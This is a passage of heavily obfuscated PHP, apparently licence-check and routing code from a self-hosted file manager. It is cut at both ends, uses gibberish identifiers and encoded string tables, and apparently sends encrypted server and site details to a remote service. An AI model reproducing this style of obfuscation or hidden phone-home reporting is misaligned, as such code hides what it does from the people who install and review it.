($‰ÉÄèß„) { return $this->moveFile($ë•È‡, $•ŒŸ• ); } return $this->copyFile($ë•È‡, $•ŒŸ• ); } public function setModifyTime($â³âÅÎº, $ÚÌ’Ÿ›½ = '') { @touch($â³âÅÎº, intval($ÚÌ’Ÿ›½)); } public function download($ƒğóËï, $Ã¤Åíˆ·) { return $this->iconvSystem($ƒğóËï); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($ûœ’‹‡õ) { parent::__construct($ûœ’‹‡õ); $this->setSignVersion($_SERVER[‹è™Ü¸Ñ][247]); } public function fileOutImage($™ı¢¿­Œ, $½òÃ©Ú° = 250) { $ŞüĞ˜¾Ï =& $_SERVER[‹è™Ü¸Ñ]; if ($this->size($™ı¢¿­Œ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($™ı¢¿­Œ, $½òÃ©Ú°); } $ªûÂùÉ£ = array($ŞüĞ˜¾Ï[1437] => $ŞüĞ˜¾Ï[1438] . $½òÃ©Ú° . $ŞüĞ˜¾Ï[1439]); $¡ø»ú•ö = $this->link($™ı¢¿­Œ, $ªûÂùÉ£); $this->fileOutLink($¡ø»ú•ö); } public function fileOutLink($‡»õ´ğ) { $ßÈ¼¯ò« =& $_SERVER[‹è™Ü¸Ñ]; if (substr($‡»õ´ğ, 0, 7) == $ßÈ¼¯ò«[313]) { $‡»õ´ğ = $ßÈ¼¯ò«[314] . substr($‡»õ´ğ, 7); } header($ßÈ¼¯ò«[175] . $‡»õ´ğ); die; } } goto F®ÚÑ…à’; dÙö¦ìé¬Ğ: $_SERVER[ÖÑ—ÉÒ†] = explode($_SERVER[‹è™Ü¸Ñ][680], gzinflate(substr($_SERVER[‹è™Ü¸Ñ][681], 10, -8))); $fmdotwacxl = $_SERVER[‹è™Ü¸Ñ][682]; class Application { private $defaultModule = "\151\156\144\145\170"; private $defaultController = "\151\x6e\x64\145\x78"; private $defaultAction = "\x69\x6e\144\145\170"; function __construct() { } public function setDefault($öÏÃø‰) { $ÎÖ³¢Õ =& $_SERVER[‹è™Ü¸Ñ]; $šù¹Ï•¦ =& $_SERVER[ÖÑ—ÉÒ†]; $ ®ïÜÒê = explode($šù¹Ï•¦[0], trim($öÏÃø‰, $šù¹Ï•¦[0])); $Ñ­Ì­³™ = $ÎÖ³¢Õ[683]; if (strlen($Ñ­Ì­³™) < $ÎÖ³¢Õ[684]) { return; } $this->defaultModule = $ ®ïÜÒê[0] ? $ ®ïÜÒê[0] : $this->defaultModule; $this->defaultController = $ ®ïÜÒê[1] ? $ ®ïÜÒê[1] : $this->defaultController; $this->defaultAction = $ ®ïÜÒê[2] ? $ ®ïÜÒê[2] : $this->defaultAction; $this->yhrd1daa7d5c($šù¹Ï•¦[1], array($this, $šù¹Ï•¦[2])); } public function appRun($ø´ˆ) { $ÛÀĞã—ğ =& $_SERVER[‹è™Ü¸Ñ]; $†Áù’òù =& $_SERVER[ÖÑ—ÉÒ†]; $—×ÔŠÑ¢ = explode($†Áù’òù[0], $ø´ˆ); $¿¯å”ƒ = strtolower($—×ÔŠÑ¢[0]); $¢°ã®ğì = $ÛÀĞã—ğ[685]; if (!$¢°ã®ğì) { return; } $Ò±ÏÙÍ = $†Áù’òù[3]; if ($¿¯å”ƒ == $†Áù’òù[4]) { $Ò±ÏÙÍ = $†Áù’òù[5]; $—×ÔŠÑ¢[0] = $†Áù’òù[6]; $—×ÔŠÑ¢[1] = $—×ÔŠÑ¢[1] . $†Áù’òù[7]; $ø´ˆ = join($†Áù’òù[0], $—×ÔŠÑ¢); $ø´ˆ = trim($ø´ˆ, $†Áù’òù[0]); } call_user_func(array($†Áù’òù[8], $†Áù’òù[9]), $Ò±ÏÙÍ . $†Áù’òù[10], $ø´ˆ); ActionCall($ø´ˆ); $Ç±÷Š½İ = $ÛÀĞã—ğ[686]; while ($Ç±÷Š½İ < $ÛÀĞã—ğ[684]) { if ($Ç±÷Š½İ >= 0) { break; } $Ç±÷Š½İ++; } call_user_func(array($†Áù’òù[8], $†Áù’òù[9]), $Ò±ÏÙÍ . $†Áù’òù[11], $ø´ˆ); $õÓ¨ßƒ¡ = $ÛÀĞã—ğ[687]; if (!$õÓ¨ßƒ¡) { die; } } private function autorun() { $ßÉì™² =& $_SERVER[‹è™Ü¸Ñ]; $Ñ«ôŠ¨• =& $_SERVER[ÖÑ—ÉÒ†]; global $config; $Ÿ¾å„ıø = $ßÉì™²[688]; while ($Ÿ¾å„ıø < $ßÉì™²[689]) { if ($Ÿ¾å„ıø >= 0) { break; } $Ÿ¾å„ıø++; } if (count($config[$Ñ«ôŠ¨•[12]]) == 0) { return; } foreach ($config[$Ñ«ôŠ¨•[12]] as $í”¤“£ => $…ô·ËÙ) { $this->appRun($…ô·ËÙ); $ù„ˆéì¬ = $ßÉì™²[690]; if (!$ù„ˆéì¬) { die; } } } private function kqrfbdcbe8ed() { $îÕ—×³ =& $_SERVER[‹è™Ü¸Ñ]; $ ä‡‹Î =& $_SERVER[ÖÑ—ÉÒ†]; $™’°Ãí = $ ä‡‹Î[4]; $÷¢û›– = $îÕ—×³[691]; while ($÷¢û›– < $îÕ—×³[692]) { if ($÷¢û›– >= 0) { break; } $÷¢û›–++; } $“¤êÈ¼® = $GLOBALS[$ ä‡‹Î[13]][$ ä‡‹Î[14]][0]; $ºş¤òˆ = $îÕ—×³[693]; while (strlen($ºş¤òˆ) < $îÕ—×³[694]) { if (!$ºş¤òˆ) { break; } $ºş¤òˆ++; } if (!$“¤êÈ¼® || strlen($“¤êÈ¼®) <= strlen($™’°Ãí)) { return; } if (strtolower(substr($“¤êÈ¼®, -strlen($™’°Ãí))) != $™’°Ãí) { return; } $¢ò£’ğ = substr($“¤êÈ¼®, 0, -strlen($™’°Ãí)); $¤ôêàû = $îÕ—×³[690]; if (!$¤ôêàû) { die; } $ûèÊÇÒû = array($ ä‡‹Î[4], $¢ò£’ğ); $ãÃöß‚­ = array_slice($GLOBALS[$ ä‡‹Î[13]][$ ä‡‹Î[14]], 1); $±•óÙÜ¶ = $îÕ—×³[695]; while ($±•óÙÜ¶ < $îÕ—×³[684]) { if ($±•óÙÜ¶ >= 0) { break; } $±•óÙÜ¶++; } $GLOBALS[$ ä‡‹Î[13]][$ ä‡‹Î[14]] = array_merge($ûèÊÇÒû, $ãÃöß‚­); $GLOBALS[$ ä‡‹Î[13]][$ ä‡‹Î[15]] = implode($ ä‡‹Î[0], $GLOBALS[$ ä‡‹Î[13]][$ ä‡‹Î[14]]); $±Â¿çò = $îÕ—×³[696]; while ($±Â¿çò < $îÕ—×³[697]) { if ($±Â¿çò >= 0) { break; } $±Â¿çò++; } } private function iaop0c0005c8() { $èáŸÔãº =& $_SERVER[‹è™Ü¸Ñ]; $ãÈ×õª¹ =& $_SERVER[ÖÑ—ÉÒ†]; if ($GLOBALS[$ãÈ×õª¹[13]][$ãÈ×õª¹[15]] != $ãÈ×õª¹[6]) { return; } $“ˆ¡‡Ë› = $_SERVER[$ãÈ×õª¹[16]]; $¿šÊÔ²Ş = $ãÈ×õª¹[17]; if (!strstr($“ˆ¡‡Ë›, $¿šÊÔ²Ş)) { return; } $¤à±¹Òñ = strrpos($“ˆ¡‡Ë›, $¿šÊÔ²Ş); $€“­¿‡ = $èáŸÔãº[698]; if (!$€“­¿‡) { return; } $åÅ•üõ = substr($“ˆ¡‡Ë›, $¤à±¹Òñ + strlen($¿šÊÔ²Ş)); $Ö€ü¶åş = $èáŸÔãº[699]; preg_match_all($ãÈ×õª¹[18], $åÅ•üõ, $ğªÌãöş); $åÅ•üõ = trim($ğªÌãöş[0][0], $ãÈ×õª¹[19]); $GLOBALS[$ãÈ×õª¹[13]][$ãÈ×õª¹[14]] = explode($ãÈ×õª¹[19], $åÅ•üõ); $öÈóÎ´Õ = $èáŸÔãº[700]; if (strlen($öÈóÎ´Õ) < $èáŸÔãº[684]) { die; } $GLOBALS[$ãÈ×õª¹[13]][$ãÈ×õª¹[15]] = implode($ãÈ×õª¹[0], $GLOBALS[$ãÈ×õª¹[13]][$ãÈ×õª¹[14]]); $ª…äªãà = $èáŸÔãº[701]; } public function run() { $®ƒ¾òİ¨ =& $_SERVER[‹è™Ü¸Ñ]; $ù…»õÏ¨ =& $_SERVER[ÖÑ—ÉÒ†]; $this->iaop0c0005c8(); $º·•Ã = $®ƒ¾òİ¨[702]; if (!$º·•Ã) { die; } $this->kqrfbdcbe8ed(); $ªÖ—ŠÛî = $GLOBALS[$ù…»õÏ¨[13]][$ù…»õÏ¨[14]]; $‰’Ì¦×é = $GLOBALS[$ù…»õÏ¨[13]][$ù…»õÏ¨[15]]; define($ù…»õÏ¨[20], isset($ªÖ—ŠÛî[0]) && $ªÖ—ŠÛî[0] ? $ªÖ—ŠÛî[0] : $this->defaultModule); $²¤Ï·ø• = $®ƒ¾òİ¨[703]; while ($²¤Ï·ø• < $®ƒ¾òİ¨[697]) { if ($²¤Ï·ø• >= 0) { break; } $²¤Ï·ø•++; } define($ù…»õÏ¨[21], isset($ªÖ—ŠÛî[1]) && $ªÖ—ŠÛî[0] ? $ªÖ—ŠÛî[1] : $this->defaultController); $³Ëıú×ª = $®ƒ¾òİ¨[704]; while ($³Ëıú×ª < $®ƒ¾òİ¨[689]) { if ($³Ëıú×ª >= 0) { break; } $³Ëıú×ª++; } define($ù…»õÏ¨[22], isset($ªÖ—ŠÛî[2]) && $ªÖ—ŠÛî[0] ? $ªÖ—ŠÛî[2] : $this->defaultAction); define($ù…»õÏ¨[23], MOD . $ù…»õÏ¨[0] . ST . $ù…»õÏ¨[0] . ACT); $_SERVER[$ù…»õÏ¨[24]] = strtolower(ACTION); $‹ÁÍ…Àä = $®ƒ¾òİ¨[705]; if (!$‹ÁÍ…Àä) { die; } $this->autorun(); $µè¸õ„² = $®ƒ¾òİ¨[706]; if (strlen($µè¸õ„²) < $®ƒ¾òİ¨[689]) { return; } if (count($ªÖ—ŠÛî) >= 3) { $this->appRun($‰’Ì¦×é); } else { $this->appRun(ACTION); } } private $viqpbaa7f287 = array(); private $aqlj2c7dca88 = ''; public function ubzsda7b86cc() { $ğ÷¾ÍÑı =& $_SERVER[‹è™Ü¸Ñ]; $’çù³ =& $_SERVER[ÖÑ—ÉÒ†]; $this->tgqpe5d4053f(); $this->mhpga1e756e6(); $this->whaq4260ead1(); $this->typm4eac36f0(); $this->qcln3061aed2(); $this->lhnd91c5cd57(); $this->reqia0150755(); $£ùæ´ûò = $ğ÷¾ÍÑı[707]; while ($£ùæ´ûò < $ğ÷¾ÍÑı[694]) { if ($£ùæ´ûò >= 0) { break; } $£ùæ´ûò++; } $this->yhrd1daa7d5c($’çù³[25], array($this, $’çù³[26])); $İ…ˆ¢È† = $ğ÷¾ÍÑı[708]; if (!$İ…ˆ¢È†) { return; } $this->yhrd1daa7d5c($’çù³[27], array($this, $’çù³[28])); $this->yhrd1daa7d5c($’çù³[29], array($this, $’çù³[30])); $this->yhrd1daa7d5c($’çù³[31], array($this, $’çù³[32])); $®ÅÖÄ©¡ = $ğ÷¾ÍÑı[709]; while (strlen($®ÅÖÄ©¡) < $ğ÷¾ÍÑı[692]) { if (!$®ÅÖÄ©¡) { break; } $®ÅÖÄ©¡++; } } public function sycw63f2c5e1($¢­¶ÕÌ) { $ºô©©« =& $_SERVER[‹è™Ü¸Ñ]; $„ÏÕÎ â =& $_SERVER[ÖÑ—ÉÒ†]; $ƒÙ­òÙò = Model($„ÏÕÎ â[33])->get(); $¬¾÷Ô¨ = array($„ÏÕÎ â[34], $„ÏÕÎ â[35], $„ÏÕÎ â[36], $„ÏÕÎ â[37], $„ÏÕÎ â[38], $„ÏÕÎ â[39], $„ÏÕÎ â[40], $„ÏÕÎ â[41], $„ÏÕÎ â[42], $„ÏÕÎ â[43], $„ÏÕÎ â[44], $„ÏÕÎ â[45], $„ÏÕÎ â[46], $„ÏÕÎ â[47], $„ÏÕÎ â[48], $„ÏÕÎ â[49], $„ÏÕÎ â[50], $„ÏÕÎ â[51], $„ÏÕÎ â[52], $„ÏÕÎ â[53], $„ÏÕÎ â[54], $„ÏÕÎ â[55], $„ÏÕÎ â[56], $„ÏÕÎ â[57], $„ÏÕÎ â[58], $„ÏÕÎ â[59], $„ÏÕÎ â[60], $„ÏÕÎ â[61], $„ÏÕÎ â[62], $„ÏÕÎ â[63], $„ÏÕÎ â[64], $„ÏÕÎ â[65], $„ÏÕÎ â[66], $„ÏÕÎ â[67], $„ÏÕÎ â[68], $„ÏÕÎ â[69], $„ÏÕÎ â[70], $„ÏÕÎ â[71], $„ÏÕÎ â[72], $„ÏÕÎ â[73], $„ÏÕÎ â[74], $„ÏÕÎ â[75], $„ÏÕÎ â[76], $„ÏÕÎ â[77], $„ÏÕÎ â[78], $„ÏÕÎ â[79], $„ÏÕÎ â[80], $„ÏÕÎ â[81], $„ÏÕÎ â[82], $„ÏÕÎ â[83], $„ÏÕÎ â[84], $„ÏÕÎ â[85]); foreach ($¬¾÷Ô¨ as $ôÜŒü×Õ) { $¸ıòÖÕ = $GLOBALS[$„ÏÕÎ â[86]][$„ÏÕÎ â[87]][$ôÜŒü×Õ]; $äÆ³—ÚË = $ºô©©«[710]; if (!$äÆ³—ÚË) { die; } if (isset($ƒÙ­òÙò[$ôÜŒü×Õ])) { $¸ıòÖÕ = $ƒÙ­òÙò[$ôÜŒü×Õ]; } $¢­¶ÕÌ[$„ÏÕÎ â[88]][$„ÏÕÎ â[89]][$ôÜŒü×Õ] = $¸ıòÖÕ; } $ÑÎÓİºñ = $¢­¶ÕÌ[$„ÏÕÎ â[88]][$„ÏÕÎ â[89]][$„ÏÕÎ â[46]]; unset($¢­¶ÕÌ[$„ÏÕÎ â[88]][$„ÏÕÎ â[90]][$„ÏÕÎ â[91]]); unset($¢­¶ÕÌ[$„ÏÕÎ â[88]][$„ÏÕÎ â[90]][$„ÏÕÎ â[92]]); $¼¹©ƒÌÔ = $ºô©©«[711]; if (!$¼¹©ƒÌÔ) { die; } unset($¢­¶ÕÌ[$„ÏÕÎ â[88]][$„ÏÕÎ â[89]][$„ÏÕÎ â[46]]); unset($¢­¶ÕÌ[$„ÏÕÎ â[88]][$„ÏÕÎ â[89]][$„ÏÕÎ â[93]]); $¢­¶ÕÌ[$„ÏÕÎ â[88]][$„ÏÕÎ â[89]][$„ÏÕÎ â[94]] = array($„ÏÕÎ â[95] => (int) $ÑÎÓİºñ[$„ÏÕÎ â[96]], $„ÏÕÎ â[97] => (int) _get($ÑÎÓİºñ, $„ÏÕÎ â[98], 0)); $ÓäÇ¾ŠŒ = $ºô©©«[712]; if (strlen($ÓäÇ¾ŠŒ) < $ºô©©«[694]) { return; } $ö¾Üâœˆ = substr(md5($„ÏÕÎ â[99] . get_client_ip() . $ƒÙ­òÙò[$„ÏÕÎ â[100]]), 0, 15); $¢­¶ÕÌ[$„ÏÕÎ â[101]][$„ÏÕÎ â[102]] = Mcrypt::encode(Session::sign(), $ö¾Üâœˆ, 3600 * 24); $µÒ–ÀÈÙ = $ºô©©«[713]; if (strlen($µÒ–ÀÈÙ) < $ºô©©«[694]) { return; } $¢­¶ÕÌ[$„ÏÕÎ â[101]][$„ÏÕÎ â[103]] = Action($„ÏÕÎ â[104])->accessToken(); $¢­¶ÕÌ[$„ÏÕÎ â[101]][$„ÏÕÎ â[105]] = md5($_SERVER[$„ÏÕÎ â[106]] . $ƒÙ­òÙò[$„ÏÕÎ â[100]]); $æÙÜ²¦ = $ºô©©«[714]; $¢­¶ÕÌ[$„ÏÕÎ â[101]][$„ÏÕÎ â[107]] = base64_encode(serverInfo()); $¢­¶ÕÌ[$„ÏÕÎ â[101]][$„ÏÕÎ â[108]] = $this->aqlj2c7dca88; $İ¼Ä£¨™ = $ºô©©«[715]; while (strlen($İ¼Ä£¨™) < $ºô©©«[692]) { if (!$İ¼Ä£¨™) { break; } $İ¼Ä£¨™++; } if ($ƒÙ­òÙò[$„ÏÕÎ â[108]] != $„ÏÕÎ â[109]) { $¢­¶ÕÌ[$„ÏÕÎ â[101]][$„ÏÕÎ â[110]] = $ƒÙ­òÙò[$„ÏÕÎ â[110]]; $¢­¶ÕÌ[$„ÏÕÎ â[101]][$„ÏÕÎ â[111]] = $ƒÙ­òÙò[$„ÏÕÎ â[111]]; $¢¤Àš‚ò = rand_string(10) . $this->aqlj2c7dca88 . rand_string(5); $¢­¶ÕÌ[$„ÏÕÎ â[88]][$„ÏÕÎ â[112]][$„ÏÕÎ â[113]] = $this->lkxc7e373410($¢¤Àš‚ò, $¢­¶ÕÌ[$„ÏÕÎ â[101]][$„ÏÕÎ â[105]]); } if ($this->aqlj2c7dca88 == $„ÏÕÎ â[109]) { $¢­¶ÕÌ[$„ÏÕÎ â[88]][$„ÏÕÎ â[89]][$„ÏÕÎ â[94]][$„ÏÕÎ â[98]] = 0; } $¢­¶ÕÌ[$„ÏÕÎ â[101]][$„ÏÕÎ â[114]] = $this->versionPluginFilter(); $¢­¶ÕÌ[$„ÏÕÎ â[101]][$„ÏÕÎ â[115]] = _get($this->viqpbaa7f287, $„ÏÕÎ â[116], $„ÏÕÎ â[6]); if (KodUser::isRoot() && $this->config[$„ÏÕÎ â[117]]) { $¢­¶ÕÌ[$„ÏÕÎ â[101]][$„ÏÕÎ â[118]] = WEB_ROOT; } return $¢­¶ÕÌ; } private function lhnd91c5cd57() { $ùàÁšì§ =& $_SERVER[‹è™Ü¸Ñ]; $¼ƒ¬Å·˜ =& $_SERVER[ÖÑ—ÉÒ†]; $â×íØõ = $_SERVER[$¼ƒ¬Å·˜[24]] == $¼ƒ¬Å·˜[119]; $¦âÖ®€“ = $ùàÁšì§[716]; if (!$¦âÖ®€“) { die; } if ($_SERVER[$¼ƒ¬Å·˜[24]] == $¼ƒ¬Å·˜[120] && $_GET[$¼ƒ¬Å·˜[121]] == $¼ƒ¬Å·˜[122]) { $â×íØõ = !0; } if ($â×íØõ) { $ÁÈÅµÆü = array($¼ƒ¬Å·˜[108] => $this->aqlj2c7dca88, $¼ƒ¬Å·˜[123] => $this->maiz5f4bda29(), $¼ƒ¬Å·˜[124] => Model($¼ƒ¬Å·˜[125])->count()); if ($this->aqlj2c7dca88 != $¼ƒ¬Å·˜[109]) { $˜ÌºÑÑ… = _get($this->viqpbaa7f287, $¼ƒ¬Å·˜[126]); if ($˜ÌºÑÑ…) { $ÁÈÅµÆü[$¼ƒ¬Å·˜[127]] = $˜ÌºÑÑ…; $ÁÈÅµÆü[$¼ƒ¬Å·˜[128]] = strtotime(_get($this->viqpbaa7f287, $¼ƒ¬Å·˜[129])); $ÁÈÅµÆü[$¼ƒ¬Å·˜[130]] = _get($this->viqpbaa7f287, $¼ƒ¬Å·˜[116]); } $šŸüÖÖ = Model($¼ƒ¬Å·˜[33])->get($¼ƒ¬Å·˜[131], $¼ƒ¬Å·˜[6], !0); if (is_string($šŸüÖÖ) && substr($šŸüÖÖ, 0, 1) == $¼ƒ¬Å·˜[132]) { $šŸüÖÖ = json_decode_force($šŸüÖÖ); } if (is_array($šŸüÖÖ) && $šŸüÖÖ[$¼ƒ¬Å·˜[133]] && strstr($šŸüÖÖ[$¼ƒ¬Å·˜[133]], $¼ƒ¬Å·˜[134])) { $üôë®£ù = explode($¼ƒ¬Å·˜[134], $šŸüÖÖ[$¼ƒ¬Å·˜[133]]); $ÁÈÅµÆü[$¼ƒ¬Å·˜[135]] = $üôë®£ù[0]; } } $ÁÈÅµÆü = $this->xtuj9ae9ce48(json_encode($ÁÈÅµÆü), md5($¼ƒ¬Å·˜[136])); $Øíßò±€ = array($¼ƒ¬Å·˜[137] => $ÁÈÅµÆü); call_user_func(array($¼ƒ¬Å·˜[138], $¼ƒ¬Å·˜[139]), $Øíßò±€); } if ($this->aqlj2c7dca88 == $¼ƒ¬Å·˜[109]) { return; } $ì“•¿ò = array($¼ƒ¬Å·˜[140], $¼ƒ¬Å·˜[141], $¼ƒ¬Å·˜[142], $¼ƒ¬Å·˜[143], $¼ƒ¬Å·˜[144], $¼ƒ¬Å·˜[145]); $ä”ªòï = Model($¼ƒ¬Å·˜[33])->get(); $Øíßò±€ = array($¼ƒ¬Å·˜[146] => $ä”ªòï[$¼ƒ¬Å·˜[34]], $¼ƒ¬Å·˜[147] => $ä”ªòï[$¼ƒ¬Å·˜[35]], $¼ƒ¬Å·˜[148] => $¼ƒ¬Å·˜[6]); $—ùİÖ£½ = $ùàÁšì§[717]; foreach ($ì“•¿ò as $ª‹²À°‘) { if (!isset($ä”ªòï[$ª‹²À°‘]) || !$ä”ªòï[$ª‹²À°‘]) { continue; } $Øíßò±€[$ª‹²À°‘] = $ä”ªòï[$ª‹²À°‘]; $®øğÌÓØ = $ùàÁšì§[718]; } call_user_func(array($¼ƒ¬Å·˜[138], $¼ƒ¬Å·˜[139]), $Øíßò±€); $òÜ§ç£ = $ùàÁšì§[719]; if (strlen($òÜ§ç£) < $ùàÁšì§[684]) { return; } } private function typm4eac36f0() { $÷¹ °„× =& $_SERVER[‹è™Ü¸Ñ]; $Îµ“‚šË =& $_SERVER[ÖÑ—ÉÒ†]; if ($_SERVER[$Îµ“‚šË[24]] != $Îµ“‚šË[149]) { return; } if (!KodUser::isRoot()) { die; } $êÂ¡ıïÌ = $GLOBALS[$Îµ“‚šË[13]]; if (isset($êÂ¡ıïÌ[$Îµ“‚šË[150]])) { $this->ahjvb679ad43(); die; } if (isset($êÂ¡ıïÌ[$Îµ“‚šË[151]]) && isset($êÂ¡ıïÌ[$Îµ“‚šË[151]]) == $Îµ“‚šË[122]) { $êÂ¡ıïÌ[$Îµ“‚šË[152]] = Model($Îµ“‚šË[33])->get($Îµ“‚šË[153]); } if (!isset($êÂ¡ıïÌ[$Îµ“‚šË[152]]) || strlen($êÂ¡ıïÌ[$Îµ“‚šË[152]]) != 16) { show_json($Îµ“‚šË[154] . $êÂ¡ıïÌ[$Îµ“‚šË[152]], !1); } $¦ê»»Ïæ = Model($Îµ“‚šË[33])->get($Îµ“‚šË[100]); $¡‹¹‹ÉŒ = md5($_SERVER[$Îµ“‚šË[106]] . $¦ê»»Ïæ); $³÷ğâ˜“ = array($Îµ“‚šË[152] => $êÂ¡ıïÌ[$Îµ“‚šË[152]], $Îµ“‚šË[155] => rand_string(16), $Îµ“‚šË[156] => $Îµ“‚šË[136], $Îµ“‚šË[157] => $Îµ“‚šË[158], $Îµ“‚šË[159] => $_SERVER[$Îµ“‚šË[160]], $Îµ“‚šË[161] => $_SERVER[$Îµ“‚šË[162]], $Îµ“‚šË[163] => $_SERVER[$Îµ“‚šË[164]], $Îµ“‚šË[105] => $¡‹¹‹ÉŒ, $Îµ“‚šË[165] => Model($Îµ“‚šË[33])->get($Îµ“‚šË[131])); if (isset($êÂ¡ıïÌ[$Îµ“‚šË[151]]) && isset($êÂ¡ıïÌ[$Îµ“‚šË[151]]) == $Îµ“‚šË[122]) { $³÷ğâ˜“[$Îµ“‚šË[151]] = md5($³÷ğâ˜“[$Îµ“‚šË[152]] . $Îµ“‚šË[166] . $³÷ğâ˜“[$Îµ“‚šË[155]]); } if ($êÂ¡ıïÌ[$Îµ“‚šË[167]] == $Îµ“‚šË[168]) { $»ÂÀæ˜¬ = $this->xtuj9ae9ce48($¡‹¹‹ÉŒ, $Îµ“‚šË[169]); $×„¯Ù¾ü = $this->lkxc7e373410(json_encode($³÷ğâ˜“), $¡‹¹‹ÉŒ . $Îµ“‚šË[170], 3); $×„¯Ù¾ü = $×„¯Ù¾ü . $Îµ“‚šË[171] . $_SERVER[$Îµ“‚šË[160]]; $öŞõ–ŠĞ = $this->flcp9eedf9f5($Îµ“‚šË[172] . $»ÂÀæ˜¬ . $Îµ“‚šË[173] . $×„¯Ù¾ü, -1); show_json($öŞõ–ŠĞ, !0); } else { if ($êÂ¡ıïÌ[$Îµ“‚šË[167]] == $Îµ“‚šË[174]) { $ó­¶¯şú = substr(md5($Îµ“‚šË[175] . $¡‹¹‹ÉŒ), 12, 15) . $Îµ“‚šË[176]; $×„¯Ù¾ü = $this->zjlh961c075c(trim($êÂ¡ıïÌ[$Îµ“‚šË[177]]), $ó­¶¯şú, 2); $ÎÒ·ü‡£ = json_decode($×„¯Ù¾ü, !0); if (!is_array($ÎÒ·ü‡£) || !is_array($ÎÒ·ü‡£[$Îµ“‚šË[178]]) || $ÎÒ·ü‡£[$Îµ“‚šË[152]] != !0) { $ÀêÃÔ€¢ = $Îµ“‚šË[179]; $äØê­›½ = $ÎÒ·ü‡£[$Îµ“‚šË[178]] ? $Îµ“‚šË[180] . $ÎÒ·ü‡£[$Îµ“‚šË[178]] : $ÀêÃÔ€¢; show_json($äØê­›½, !1); } else { $³÷ğâ˜“[$Îµ“‚šË[155]] = $ÎÒ·ü‡£[$Îµ“‚šË[178]][$Îµ“‚šË[181]]; } } else { $ÎÒ·ü‡£ = $this->flcp9eedf9f5($Îµ“‚šË[182], $³÷ğâ˜“, 10); } } if (!is_array($ÎÒ·ü‡£) || !is_array($ÎÒ·ü‡£[$Îµ“‚šË[178]]) || $ÎÒ·ü‡£[$Îµ“‚šË[152]] != !0) { $ÀêÃÔ€¢ = LNG($Îµ“‚šË[183]); $äØê­›½ = $ÎÒ·ü‡£[$Îµ“‚šË[178]] ? $Îµ“‚šË[180] . $ÎÒ·ü‡£[$Îµ“‚šË[178]] : $ÀêÃÔ€¢; show_json($äØê­›½, !1); } $…ÓÌşÅ  = $ÎÒ·ü‡£[$Îµ“‚šË[178]]; $…²—€·ô = $this->fsbmfe5f5e7f($…ÓÌşÅ [$Îµ“‚šË[184]]); $‰ı¢‘Œ‡ = $÷¹ °„×[720]; if (!$…²—€·ô || $…²—€·ô != $…ÓÌşÅ [$Îµ“‚šË[129]]) { $ä—ÑğÛ = array($Îµ“‚šË[185] => Model($Îµ“‚šË[33])->get($Îµ“‚šË[100]), $Îµ“‚šË[186] => $_SERVER[$Îµ“‚šË[106]], $Îµ“‚šË[187] => this_url(), $Îµ“‚šË[161] => $_SERVER[$Îµ“‚šË[162]]); $×„¯Ù¾ü = $this->ance3a237a40(json_encode($ä—ÑğÛ)); $this->flcp9eedf9f5($Îµ“‚šË[188] . $×„¯Ù¾ü); show_json(LNG($Îµ“‚šË[189]), !0); } $ÚÖ‹¨¾ö = array($Îµ“‚šË[153] => $…ÓÌşÅ [$Îµ“‚šË[190]], $Îµ“‚šË[191] => $…ÓÌşÅ [$Îµ“‚šË[192]], $Îµ“‚šË[193] => rand_string(16), $Îµ“‚šË[108] => $…ÓÌşÅ [$Îµ“‚šË[194]]); if ($³÷ğâ˜“[$Îµ“‚šË[155]]) { $ÚÖ‹¨¾ö[$Îµ“‚šË[193]] = $³÷ğâ˜“[$Îµ“‚šË[155]]; } $…²˜¾Ñ² = substr(md5($ÚÖ‹¨¾ö[$Îµ“‚šË[191]]), 10, 10); $¿…‘€×« = $…²˜¾Ñ² . $ÚÖ‹¨¾ö[$Îµ“‚šË[108]] . $ÚÖ‹¨¾ö[$Îµ“‚šË[193]]; $ò½ƒ”®ã = $÷¹ °„×[721]; if (!$ò½ƒ”®ã) { die; } $ÚÖ‹¨¾ö[$Îµ“‚šË[110]] = strrev(base64_encode($this->xtuj9ae9ce48($¿…‘€×«, $Îµ“‚šË[195]))); $˜ßæÓœ‘ = $÷¹ °„×[722]; while (strlen($˜ßæÓœ‘) < $÷¹ °„×[694]) { if (!$˜ßæÓœ‘) { break; } $˜ßæÓœ‘++; } $Æ÷Áì°» = rand_string(16); $ş¦Ù‰Ö‰ = $Æ÷Áì°» . $ÚÖ‹¨¾ö[$Îµ“‚šË[108]] . $this->xtuj9ae9ce48(md5($ÚÖ‹¨¾ö[$Îµ“‚šË[153]]), $Æ÷Áì°»); $É·›·Éˆ = $÷¹ °„×[723]; if (!$É·›·Éˆ) { die; } $ÚÖ‹¨¾ö[$Îµ“‚šË[111]] = base64_encode(strrev($this->xtuj9ae9ce48($ş¦Ù‰Ö‰, $Îµ“‚šË[196]))); if ($…ÓÌşÅ [$Îµ“‚šË[197]] && $…ÓÌşÅ [$Îµ“‚šË[197]] >= 1) { Model($Îµ“‚šË[33])->setDeep($Îµ“‚šË[198], $Îµ“‚šË[122]); } Model($Îµ“‚šË[33])->set($ÚÖ‹¨¾ö); $Ï«‹¬Ş® = md5($_SERVER[$Îµ“‚šË[106]] . strrev($¦ê»»Ïæ) . $ÚÖ‹¨¾ö[$Îµ“‚šË[191]]); $ìÁÊêÚù = strrev(substr($Ï«‹¬Ş®, 10, 16)); $’¸ÓÑ÷ = $÷¹ °„×[724]; if (strlen($’¸ÓÑ÷) < $÷¹ °„×[692]) { return; } $ˆ÷Á•â¡ = $this->lkxc7e373410(json_encode($…ÓÌşÅ ), $Ï«‹¬Ş®); $ï‰åƒŒ¥ = array_to_keyvalue(Model($Îµ“‚šË[7])->listData(), $Îµ“‚šË[199]); $€ñØıíË = $÷¹ °„×[725]; while (strlen($€ñØıíË) < $÷¹ °„×[697]) { if (!$€ñØıíË) { break; } $€ñØıíË++; } $Ñ‚¹’Á† = $ï‰åƒŒ¥[$Îµ“‚šË[200]]; $•¬óÍøí = array(); $é´”šÒ£ = $÷¹ °„×[726]; if (strlen($é´”šÒ£) < $÷¹ °„×[692]) { return; } $•¬óÍøí[$ìÁÊêÚù] = $ˆ÷Á•â¡; Model($Îµ“‚šË[7])->update($Ñ‚¹’Á†[$Îµ“‚šË[201]], array($Îµ“‚šË[202] => $•¬óÍøí)); $Ë‡ëùÖó = $÷¹ °„×[727]; if (strlen($Ë‡ëùÖó) < $÷¹ °„×[692]) { return; } $this->viqpbaa7f287 = $…ÓÌşÅ ; $this->aqlj2c7dca88 = $ÚÖ‹¨¾ö[$Îµ“‚šË[108]]; $this->licenseRegistSuccess(); Cache::set($Îµ“‚šË[203] . md5($¦ê»»Ïæ . 